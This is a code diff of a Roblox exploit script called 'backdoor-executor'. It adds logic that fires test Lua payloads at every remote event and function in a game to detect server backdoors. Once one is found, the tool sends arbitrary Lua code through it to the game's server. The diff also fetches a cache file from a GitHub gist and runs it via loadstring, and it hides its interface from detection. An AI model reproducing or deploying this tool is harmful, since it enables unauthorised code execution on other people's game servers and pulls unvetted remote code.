@@ -1,5 +1,7 @@
 -- // SERVICES
+local HTTPService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
 local TextService = game:GetService("TextService")
 local TweenService = game:GetService("TweenService")
 local UIS = game:GetService("UserInputService")
@@ -21,31 +23,36 @@ local R6Btn = ExecutorUI.R6Btn
 local RespawnBtn = ExecutorUI.RespawnBtn
 local AttachBtn = ExecutorUI.AttachBtn
 -- // VARIABLES
-local testSource = [[local Val = Instance.new("StringValue", workspace) Val.Name = game.PlaceId]]
+local testSource = [[local daValue = Instance.new("StringValue") daValue.Name, daValue.Parent, daValue.Value = game.PlaceId, workspace, "%s"]]
 local EventInfo = {
 	["EventInstance"] = nil,
 	["EventPath"] = "",
 	["EventArgs"] = {"source"},
-	["EventSourcePlace"] = 1
+	["EventSourcePlace"] = 1,
+	["EventSourceFunc"] = nil,
 }
-local CachedPlaces = {
-	[5033592164] = {
-		["Path"] = game.JointsService:GetChildren()[1] and game.JointsService:GetChildren()[1]:GetFullName(),
-		["Args"] = {"1234567890", "source"}
-	},
-}
+local CachedPlaces = isfile("backdoor-cache.lua") and readfile("backdoor-cache.lua") or game:HttpGet("https://gist.githubusercontent.com/jLn0n/a45b23d44269c17a14b946781c9dd26f/raw/e3748e2c0aa1ce063de0745e74b0ad11f18e469a/backdoor-cache.lua", false)
 local MSG_TEXT = {
-	["AttachedEventPrint"] = "ATTACHED EVENT: %s | TYPE: %s",
-	["EventPrint"] = "EVENT: %s | TYPE: %s",
-	["OutdatedCacheWarn"] = "The cache of [%s] seems to be outdated."
+	["AttachedEventPrint"] = "\nATTACHED EVENT: %s\nTYPE: %s",
+	["EventPrint"] = "\nEVENT: %s\nTYPE: %s",
+	["OutdatedCacheWarn"] = "The cache of [%s] on PlaceId '%s' seems to be outdated."
 }
 local Debounce1, AttachDeb = true, true
+local CreateTween, CreateNotification, Draggify, ExecuteLua, GetTextSize, GotAttached, FindBackdoors, InitLines, InitTextbox, StringToInstance, SyncTextboxScrolling
 -- // MAIN
-local CreateTween = function(object, tweenInfo, goal)
+CreateNotification = function(text)
+	return StarterGui:SetCore("SendNotification", {
+		Title = "backdoor-executor",
+		Text = text,
+		Duration = 5
+	})
+end
+
+CreateTween = function(object, tweenInfo, goal)
 	return TweenService:Create(object, tweenInfo, goal)
 end
 
-local Draggify = function(frame, button)
+Draggify = function(frame, button)
 	local dragToggle = false
 	local dragInput
 	local dragStart
@@ -81,9 +88,9 @@ local Draggify = function(frame, button)
 	end)
 end
 
-local ExecuteLua = function(source)
+ExecuteLua = function(source)
 	if EventInfo.EventInstance then
-		EventInfo.EventArgs[EventInfo.EventSourcePlace] = source
+		EventInfo.EventArgs[EventInfo.EventSourcePlace] = EventInfo.EventSourceFunc and EventInfo.EventSourceFunc(source) or source
 		if EventInfo.EventInstance:IsA("RemoteEvent") then
 			EventInfo.EventInstance:FireServer(unpack(EventInfo.EventArgs))
 		elseif EventInfo.EventInstance:IsA("RemoteFunction") then
@@ -92,7 +99,30 @@ local ExecuteLua = function(source)
 	end
 end
 
-local GetTextSize = function(object)
+FindBackdoors = function()
+	for _, Object in ipairs(game:GetDescendants()) do
+		if EventInfo.EventInstance then break end
+		if Object:IsA("RemoteEvent") or Object:IsA("RemoteFunction") then
+			if Object:FindFirstChild("") or (Object.Parent:IsA("RemoteEvent") and #Object.Parent.Name == 16) or Object.Name == "" or Object.Name == "CharacterSoundEvent" or Object.Parent.Name == "MouseInfo" or Object.Parent.Name == "DefaultChatSystemChatEvents" then else
+				print(string.format(MSG_TEXT.EventPrint, Object:GetFullName(), Object.ClassName))
+				if Object:IsA("RemoteEvent") then
+					Object:FireServer(string.format(testSource, Object:GetFullName()))
+				elseif Object:IsA("RemoteFunction") then
+					coroutine.resume(coroutine.create(function() Object:InvokeServer(string.format(testSource, Object:GetFullName())) end))
+				end
+				wait()
+			end
+		end
+	end
+	local valueLOL = workspace:FindFirstChild(game.PlaceId)
+	if valueLOL and valueLOL.Value ~= "" then
+		pcall(function()
+			GotAttached(StringToInstance(valueLOL.Value))
+		end)
+	end
+end
+
+GetTextSize = function(object)
 	return TextService:GetTextSize(
 		object.Text,
 		object.TextSize,
@@ -101,7 +131,7 @@ local GetTextSize = function(object)
 	)
 end
 
-local GotAttached = function(backdooredEvent)
+GotAttached = function(backdooredEvent)
 	EventInfo.EventInstance, EventInfo.EventPath, EventInfo.EventSourcePlace = backdooredEvent, backdooredEvent:GetFullName(), table.find(EventInfo.EventArgs, "source")
 	ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 	ExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -113,27 +143,7 @@ local GotAttached = function(backdooredEvent)
 	ExecuteLua("game.Workspace[game.PlaceId]:Destroy()")
 end
 
-local FindBackdoors = function()
-	for _, Object in ipairs(game:GetDescendants()) do
-		if EventInfo.EventInstance then break end
-		if Object:IsA("RemoteEvent") or Object:IsA("RemoteFunction") then
-			if Object:FindFirstChild("") or (Object.Parent:IsA("RemoteEvent") and #Object.Parent.Name == 16) or Object.Name == "" or Object.Name == "CharacterSoundEvent" or Object.Parent.Name == "MouseInfo" or Object.Parent.Name == "DefaultChatSystemChatEvents" then else
-				print(string.format(MSG_TEXT.EventPrint, Object:GetFullName(), Object.ClassName))
-				if Object:IsA("RemoteEvent") then
-					Object:FireServer(testSource, Object.Name)
-				elseif Object:IsA("RemoteFunction") then
-					coroutine.resume(coroutine.create(function() Object:InvokeServer(testSource) end))
-				end
-				wait(.25)
-				if workspace:FindFirstChild(game.PlaceId) then
-					GotAttached(Object)
-				end
-			end
-		end
-	end
-end
-
-local InitLines = function()
+InitLines = function()
 	local line = 1
 	TextLines.Text = ""
 	string.gsub(Textbox.Text, "\n", function()
@@ -144,50 +154,53 @@ local InitLines = function()
 	end
 end
 
-local InitTextbox = function()
+InitTextbox = function()
 	InitLines()
+	Textbox.Text = string.gsub(Textbox.Text, "\t", " ")
 	local TextSize = GetTextSize(Textbox)
 	local TextLineSize = GetTextSize(TextLines)
 	-- // TextLines
 	SF_TextLines.Size = UDim2.new(0, TextLineSize.X + 9, 1, 0)
 	SF_TextLines.CanvasSize = UDim2.new(0, 0, 0, TextLineSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 5 or 0))
 	-- // Textbox
-	SF_Textbox.Position = UDim2.new(0, SF_TextLines.Size.X.Offset, 0, 0)
-	SF_Textbox.Size = UDim2.new(1, -SF_TextLines.Size.X.Offset, 1, 0)
-	SF_Textbox.CanvasSize = UDim2.new(0, (TextSize.X > TextIDE.AbsoluteSize.X and TextSize.X + 9 or 0), 0, TextSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 5 or 0))
+	SF_Textbox.Position = UDim2.new(0, (SF_TextLines.Size.X.Offset + 1), 0, 0)
+	SF_Textbox.Size = UDim2.new(1, -(SF_TextLines.Size.X.Offset + 1), 1, 0)
+	SF_Textbox.CanvasSize = UDim2.new(0, (TextSize.X > TextIDE.AbsoluteSize.X and TextSize.X + (TextSize.Y > TextIDE.AbsoluteSize.Y and 5 or 0) or 0), 0, TextSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 5 or 0))
 end
 
-local SyncTextboxScrolling = function()
-	SF_TextLines.CanvasPosition = Vector2.new(0, SF_Textbox.CanvasPosition.Y)
-end
-
-local StringToInstance = function(pathString)
+StringToInstance = function(pathString)
 	local pathSplit = string.split(pathString, ".")
 	local result = game
 	for _, path in ipairs(pathSplit) do
-		result = result:FindFirstChild(path) and result[path] or result[nil]
+		result = result:FindFirstChild(path) and result[path] or nil
 	end
 	return result
 end
 
+SyncTextboxScrolling = function()
+	SF_TextLines.CanvasPosition = Vector2.new(0, SF_Textbox.CanvasPosition.Y)
+end
+
 AttachBtn.MouseButton1Click:Connect(function()
 	if AttachDeb and not EventInfo.EventInstance then
+		CreateNotification("Press F9 to see the remotes being fired lol.")
 		AttachDeb = false
 		for cachedPlaceId, cache in pairs(CachedPlaces) do
 			if game.PlaceId == cachedPlaceId then
 				local succ, res = pcall(StringToInstance, cache.Path)
 				if succ then
-					EventInfo.EventArgs = cache.Args
+					EventInfo.EventArgs, EventInfo.EventSourceFunc = cache.Args, cache.SourceFunc or nil
 					GotAttached(res)
 					break
 				else
-					warn(string.format(MSG_TEXT.OutdatedCacheWarn, cache.Path))
+					warn(string.format(MSG_TEXT.OutdatedCacheWarn, cache.Path, game.PlaceId))
 					break
 				end
 			end
 		end
 		FindBackdoors()
 		if not EventInfo.EventInstance then
+			CreateNotification("No backdoor(s) here!")
 			print("No backdoor(s) here!")
 			wait(.5)
 			AttachDeb = true
@@ -241,10 +254,10 @@ UIS.InputBegan:Connect(function(input)
 	end
 end)
 
-do -- INIT
+do -- INITIALIZER
 	local Tween, Connection
-	GUI.Name = "backdoor-executor"
-	GUI.Parent = game:GetService("CoreGui")
+	local gethui = gethui or gethiddenui or get_hidden_gui or nil
+	GUI.Name, GUI.Parent = "backdoor-executor", gethui and gethui() or game:GetService("CoreGui")
 	MainUI.Visible = true
 	Tween = CreateTween(MainUI, TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
 		Size = UDim2.new(0, 500, 0, 300)
@@ -255,6 +268,8 @@ do -- INIT
 		Connection:Disconnect()
 		Tween:Destroy()
 	end)
-	Draggify(MainUI, Topbar)
+	Draggify(MainUI, Topbar);InitTextbox()
 	Tween:Play()
+	if not isfile("backdoor-cache.lua") then writefile("backdoor-cache.lua", CachedPlaces) end
+	CachedPlaces = loadstring(readfile("backdoor-cache.lua"))()
 end
